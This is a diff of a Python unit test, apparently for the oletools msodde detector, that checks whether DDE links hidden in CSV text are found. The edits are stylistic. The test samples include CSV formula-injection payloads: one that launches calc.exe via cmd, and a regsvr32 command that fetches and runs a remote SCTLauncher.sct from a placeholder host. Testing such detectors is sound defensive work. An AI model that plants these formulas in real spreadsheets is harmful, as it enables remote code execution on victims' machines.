@@ -21,7 +21,7 @@ class TestCSV(unittest.TestCase):
         """ write some sample texts to file, run those """
         SAMPLES = (
             "=cmd|'/k ..\\..\\..\\Windows\\System32\\calc.exe'!''",
-            "=MSEXCEL|'\\..\\..\\..\Windows\System32\\regsvr32 /s /n /u " +
+            "=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u " +
             "/i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll'!''",
             "completely innocent text"
         )
@@ -32,13 +32,11 @@ class TestCSV(unittest.TestCase):
         PREFIXES = ('', '{quote}item-before{quote}{delim}',
                     '{quote}line{delim}before{quote}\n'*LONG_SAMPLE_FACTOR,
                     '{quote}line{delim}before{quote}\n'*LONG_SAMPLE_FACTOR +
-                    '{quote}item-before{quote}{delim}',
-                   )
+                    '{quote}item-before{quote}{delim}')
         SUFFIXES = ('', '{delim}{quote}item-after{quote}',
                     '\n{quote}line{delim}after{quote}'*LONG_SAMPLE_FACTOR,
                     '{delim}{quote}item-after{quote}' +
-                    '\n{quote}line{delim}after{quote}'*LONG_SAMPLE_FACTOR,
-                   )
+                    '\n{quote}line{delim}after{quote}'*LONG_SAMPLE_FACTOR)
 
         for sample_core in SAMPLES:
             for prefix in PREFIXES:
@@ -78,7 +76,7 @@ class TestCSV(unittest.TestCase):
         links = self.get_dde_from_output(capturer)
         self.assertEqual(len(links), 1)
         self.assertEqual(links[0],
-                         "cmd '/k \..\..\..\Windows\System32\calc.exe'")
+                         r"cmd '/k \..\..\..\Windows\System32\calc.exe'")
 
     def write_and_run(self, sample_text):
         """ helper for test_texts: save text to file, run through msodde """
@@ -114,7 +112,10 @@ class TestCSV(unittest.TestCase):
                 filename = None   # just in case
 
     def get_dde_from_output(self, capturer):
-        """ helper to read dde links from captured output """
+        """ helper to read dde links from captured output
+
+        duplicate in tests/msodde/test_basic
+        """
         have_start_line = False
         result = []
         for line in capturer:
@@ -127,7 +128,7 @@ class TestCSV(unittest.TestCase):
             elif line == 'DDE Links:':
                 have_start_line = True
 
-        self.assertTrue(have_start_line) # ensure output was complete
+        self.assertTrue(have_start_line)  # ensure output was complete
         return result
 
 
